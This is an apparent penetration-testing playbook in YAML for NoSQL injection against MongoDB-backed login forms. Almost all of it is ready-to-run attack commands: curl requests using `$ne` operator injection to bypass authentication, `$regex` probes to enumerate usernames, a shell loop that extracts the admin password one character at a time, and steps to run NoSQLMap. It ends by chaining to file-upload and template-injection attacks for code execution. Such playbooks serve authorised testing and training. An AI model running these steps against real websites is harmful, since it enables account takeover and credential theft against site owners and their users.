id: nosql-injection
name: "Web — NoSQL injection (MongoDB / similar)"
description: >
  Login forms that pass query parameters directly into a MongoDB
  `find()` call without sanitization. `{$ne: ''}` style operator
  injection bypasses auth; `$regex` lets you boolean-blind dump every
  field character by character.
tags: [web, nosql, mongodb, auth-bypass, injection]
difficulty: medium

inputs:
  - name: target_url
    description: "Vulnerable login endpoint."
    required: true

steps:
  - id: confirm
    name: "Confirm NoSQL injection (auth bypass)"
    inline_command: |
      # Operator injection via JSON body:
      curl -X POST '<url>' \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin","password":{"$ne":"x"}}'
      # Via form-encoded with [bracket] syntax:
      curl -X POST '<url>' \
        -d 'username=admin&password[$ne]=x'
    inputs:
      url: "${target_url}"
    notes: |
      Either path sends `{password: {$ne: 'x'}}` to Mongo. If the app
      logs you in (or returns a session cookie) → vulnerable.

  - id: enumerate_users
    name: "Enumerate valid usernames via $regex"
    inline_command: |
      # Returns 200/redirect when username starts with the regex match:
      curl -X POST '<url>' \
        -d 'username[$regex]=^a&password[$ne]=x' -o /dev/null -w '%{http_code}\n'
      # Loop a-z, then expand the prefix iteratively.

  - id: extract_password
    name: "Boolean-blind dump the admin's password"
    inline_command: |
      # Mongo query: {username: 'admin', password: {$regex: '^X.*'}}
      # Loop char by char:
      for c in {a..z} {A..Z} {0..9} '!' '@' '#' '$'; do
        code=$(curl -s -o /dev/null -w '%{http_code}' -X POST '<url>' \
          -d "username=admin&password[\$regex]=^X$c.*")
        echo "$c → $code"
      done
      # Whichever returns 200/success → next char is found. Append, repeat.
    notes: |
      Slow but reliable. Tools like NoSQLMap or `nosqli` automate this.

  - id: full_dump_with_nosqlmap
    name: "Or skip the loop — use NoSQLMap"
    inline_command: |
      git clone https://github.com/codingo/NoSQLMap /tmp/nosqlmap
      cd /tmp/nosqlmap && python3 NoSQLMap.py
      # 2) Scan Sites → enter URL → choose blind regex injection.

  - id: post_auth_pivot
    name: "Once authenticated → look for next pivot"
    inline_command: "echo 'Authenticated session → revisit the app for admin panels, file upload, command injection, SSRF, deserialization endpoints.'"

references:
  - title: "HackTricks — NoSQL Injection"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html"
  - title: "PayloadsAllTheThings — NoSQL"
    url:   "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"

next_chains:
  - chain: file-upload-bypass
    when:   'authenticated as admin'
    reason: 'Most admin panels include uploads.'
  - chain: ssti-to-rce
    when:   'admin panel templates user input'
    reason: 'Templated admin output → SSTI.'
